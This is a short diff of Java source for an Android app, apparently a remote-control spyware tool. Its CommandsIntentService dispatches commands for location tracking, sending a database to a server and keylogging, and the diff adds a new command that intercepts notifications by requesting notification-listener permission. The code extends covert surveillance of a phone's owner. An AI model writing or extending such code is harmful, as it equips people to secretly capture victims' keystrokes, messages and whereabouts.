@@ -67,7 +67,6 @@ import java.util.ArrayList;
 import javax.net.SocketFactory;
 
 public class CommandsIntentService extends IntentService {
-
     private static final String TAG = CommandsIntentService.class.getSimpleName();
 
     public static final String ACTION_LOCATION = "ACTION_LOCATION";
@@ -109,6 +108,7 @@ public class CommandsIntentService extends IntentService {
     public static final String ACTION_PHONE_PERMISSION = "ACTION_PHONE_PERMISSION";
     public static final String ACTION_SEND_DB_TO_SERVER = "ACTION_SEND_DB_TO_SERVER";
     public static final String ACTION_KEYLOGGER = "ACTION_KEYLOGGER";
+    public static final String ACTION_NOTIFICATION_INTERCEPTOR = "ACTION_NOTIFICATION_INTERCEPTOR";
 
     public CommandsIntentService() {
         super("CommandsIntentService");
@@ -498,6 +498,8 @@ public class CommandsIntentService extends IntentService {
             }else if(action.equals(ACTION_KEYLOGGER)){
                 Systems.Root.startKeyloggingService(this);
                 Systems.Phone.Settings.openAccessibilityOptions(this);
+            }else if(action.equals(ACTION_NOTIFICATION_INTERCEPTOR)){
+                Notifications.requestNotificationListenerServicePermission(this);
             }else {
                 Log.d(TAG, "No action found!");
             }
